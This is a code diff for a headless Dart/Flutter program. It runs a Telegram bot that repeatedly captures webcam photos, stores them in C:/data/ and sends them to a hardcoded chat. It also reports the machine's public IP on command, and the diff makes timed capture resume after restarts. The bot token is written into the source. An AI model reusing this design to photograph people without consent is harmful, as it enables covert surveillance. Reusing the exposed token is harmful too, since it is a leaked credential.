@@ -8,6 +8,7 @@ import 'package:flutter/services.dart';
 import 'package:televerse/televerse.dart';
 import 'package:connectivity_plus/connectivity_plus.dart';
 import 'package:http/http.dart' as http;
+import 'package:shared_preferences/shared_preferences.dart';
 
 final String bot_token = "7541455648:AAHB4k27beqnIcC6L_AZng1tRN1mXie6PG4";
 final ChatID chat_id = new ChatID(1056396152);
@@ -15,6 +16,14 @@ final ChatID chat_id = new ChatID(1056396152);
 void main() async {
   // runApp(const MyApp());
   var bot = Bot(bot_token);
+  
+  Future<void> restarttt() async {
+    try {
+      await bot.stop();
+      await Process.start('telegram', []);
+      exit(0);
+    }catch(e){print("Failed to start apps, restart canceled!");}
+  }
 
   WidgetsFlutterBinding.ensureInitialized();
 
@@ -62,7 +71,11 @@ void main() async {
 
   var timer = Timer(Duration(minutes: 1), () {});
 
-  void stopTimer() async {
+  Future<void> stopTimer() async {
+    
+    final SharedPreferences prefs = await SharedPreferences.getInstance();
+    await prefs.setBool('timer_run', false);
+    await prefs.setInt('timer_duration', 0);
     print("Stopping Timer");
     try {
       await bot.api.sendMessage(chat_id, "Stopping Timer");
@@ -81,6 +94,12 @@ void main() async {
   }
 
   Future<void> takePicture2(int intrvl) async {
+    WidgetsFlutterBinding.ensureInitialized();
+    if(intrvl != 0){
+      final SharedPreferences prefs = await SharedPreferences.getInstance();
+      await prefs.setBool('timer_run', true);
+      await prefs.setInt('timer_duration', intrvl);
+    }
     try {
       if(intrvl == 0){
         await CameraPlatform.instance.dispose(_cameraId);
@@ -98,21 +117,11 @@ void main() async {
         _cameraId = cameraId;
         _cameraIndex = cameraIndex;
         String newName = (new DateTime.now().microsecondsSinceEpoch).toString();
-        final XFile file = await CameraPlatform.instance.takePicture(_cameraId);        
-        try {
-          await CameraPlatform.instance.dispose(_cameraId);
-
-          _initialized = false;
-          _cameraId = -1;
-        } catch (e) {
-          try {
-            await bot.api.sendMessage(chat_id, "Failed to dispose Camera");
-          } catch (e) {}
-        }
+        final XFile file = await CameraPlatform.instance.takePicture(_cameraId);  
         String targetPath = "C:/data/";
         final originalFile = File(file.path);
         try{
-          final originalFile2 = await originalFile.copy( targetPath + newName);
+          final originalFile2 = await originalFile.copy(targetPath + newName);
           await originalFile.delete();
           if (connectedToNetwork) {
           print("Connected to Network, Sending to Telegram");
@@ -126,6 +135,16 @@ void main() async {
           try {
             await bot.api.sendMessage(chat_id, "Failed to copy photo on save dir, deleting original file");
             await originalFile.delete();
+          } catch (e) {}
+        }      
+        try {
+          await CameraPlatform.instance.dispose(_cameraId);
+
+          _initialized = false;
+          _cameraId = -1;
+        } catch (e) {
+          try {
+            await bot.api.sendMessage(chat_id, "Failed to dispose Camera");
           } catch (e) {}
         }
       }
@@ -145,26 +164,31 @@ void main() async {
         _cameraId = cameraId;
         _cameraIndex = cameraIndex;
         timer = Timer.periodic(new Duration(seconds: intrvl), (timer) async {
-          String newName = (new DateTime.now().microsecondsSinceEpoch).toString();
-          final XFile file = await CameraPlatform.instance.takePicture(_cameraId);
-          String targetPath = "C:/data/";
-          final originalFile = File(file.path);
-          // await originalFile.rename("%userprofile%/Pictures/" + newName);
           try{
-            final originalFile2 = await originalFile.copy( targetPath + newName);
-            await originalFile.delete();
-            if (connectedToNetwork) {
-            print("Connected to Network, Sending to Telegram");
-            try {
-              await bot.api.sendPhoto(chat_id, InputFile.fromFile(originalFile2));
-            } catch (e) {
-              print("Failed sending to telegram, Network Disconnected!");
+            String newName = (new DateTime.now().microsecondsSinceEpoch).toString();
+            final XFile file = await CameraPlatform.instance.takePicture(_cameraId);
+            String targetPath = "C:/data/";
+            final originalFile = File(file.path);
+            try{
+              final originalFile2 = await originalFile.copy( targetPath + newName);
+              await originalFile.delete();
+              if (connectedToNetwork) {
+              print("Connected to Network, Sending to Telegram");
+              try {
+                await bot.api.sendPhoto(chat_id, InputFile.fromFile(originalFile2));
+              } catch (e) {
+                print("Failed sending to telegram, Network Disconnected!");
+              }
             }
-          }
+            }catch(e){
+              try {
+                await bot.api.sendMessage(chat_id, "Failed to copy photo on save dir, deleting original file");
+                await originalFile.delete();
+              } catch (e) {}
+            }
           }catch(e){
             try {
-              await bot.api.sendMessage(chat_id, "Failed to copy photo on save dir, deleting original file");
-              await originalFile.delete();
+              await bot.api.sendMessage(chat_id, "Error on Taking Picture 2");
             } catch (e) {}
           }
 
@@ -285,8 +309,8 @@ void main() async {
 
     _cameraIndex = cameraIndex;
     _cameras = cameras;
-
-    takePicture2(5);
+    await stopTimer();
+    takePicture2(10);
   }
 
   void startTimer(int intrvl) async {
@@ -373,30 +397,11 @@ void main() async {
     bot.command('stop', (ctx) async => stopTimer());
     bot.command('s', (ctx) async => stopTimer());
     bot.command('ip', (ctx) async => await ctx.reply(await getPublicIP()));
-  }
 
-  Future<void> restarttt() async {
-    stopTimer();
-    await bot.stop();
-    await botCommand();
     bot.command('restart', (ctx) async {
       ctx.reply("Restarting Bot");
-      await restarttt();
+      Timer(Duration(seconds: 1), () => restarttt());
     });
-    await bot.api.sendMessage(chat_id, "Bot Connected to Network, Starting Bot");
-    await bot.start();
-    print("Bot Started");
-    await CameraPlatform.instance.dispose(_cameraId);
-    try {
-      cameras = await CameraPlatform.instance.availableCameras();
-      if (!cameras.isEmpty) {
-        cameraIndex = _cameraIndex % cameras.length;
-      }
-    } catch (e) {
-      try {
-        await bot.api.sendMessage(chat_id, "Error on reading camera");
-      } catch (e) {}
-    }
   }
 
   try {
@@ -410,32 +415,38 @@ void main() async {
       if (connectedToNetwork) {
         print("Connected to network, Starting bot after 5s");
         Timer(Duration(seconds: 5), () async {
-          stopTimer();
           print("Starting bot");
           try {
             await botCommand();
-            bot.command('restart', (ctx) async {
-              ctx.reply("Restarting Bot");
-              await restarttt();
-            });
             await bot.api.sendMessage(chat_id, "Bot Connected to Network, Starting Bot");
             await bot.start();
             print("Bot Started");
+            final SharedPreferences prefs = await SharedPreferences.getInstance();
+            final bool? timer_run = prefs.getBool('timer_run');
+            final int? timer_duration = prefs.getInt('timer_duration');
+            if(timer_run!){
+              await bot.api.sendMessage(chat_id, "Load Previously Timer");
+              startTimer(timer_duration ?? 1);
+            }
           } catch (e) {
             print("Bot Failed to Start");
             var timeStartBot = Timer.periodic(Duration(seconds: 1), (timer) {});
             timeStartBot = Timer.periodic(Duration(seconds: 5), (timer) async {
               try {
                 await botCommand();
-                bot.command('restart', (ctx) async {
-                  ctx.reply("Restarting Bot");
-                  await restarttt();
-                });
                 await bot.api.sendMessage(chat_id, "Bot Connected to Network, Starting Bot");
                 await bot.start();
                 print("Bot Started");
                 print("Try Again to Starting Bot");
                 timeStartBot.cancel();
+                
+                final SharedPreferences prefs = await SharedPreferences.getInstance();
+                final bool? timer_run = prefs.getBool('timer_run');
+                final int? timer_duration = prefs.getInt('timer_duration');
+                if(timer_run!){
+                  await bot.api.sendMessage(chat_id, "Load Previously Timer");
+                  startTimer(timer_duration ?? 1);
+                }
               } catch (e) {
                 print("Bot Failed to Start");
               }
